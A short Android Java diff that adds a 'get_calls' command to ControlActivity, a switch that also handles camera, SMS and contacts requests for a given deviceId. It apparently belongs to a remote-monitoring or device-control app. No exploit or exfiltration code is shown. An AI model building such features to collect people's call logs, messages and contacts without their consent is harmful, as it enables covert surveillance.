@@ -319,6 +319,7 @@ public class ControlActivity extends Activity {
             case "start_camera": i = new Intent(this, CameraActivity.class); break;
             case "get_sms": i = new Intent(this, SmsActivity.class); break;
             case "get_contacts": i = new Intent(this, ContactsActivity.class); break;
+            case "get_calls": i = new Intent(this, CallActivity.class); break;
         }
         if (i != null) {
             i.putExtra("deviceId", deviceId);
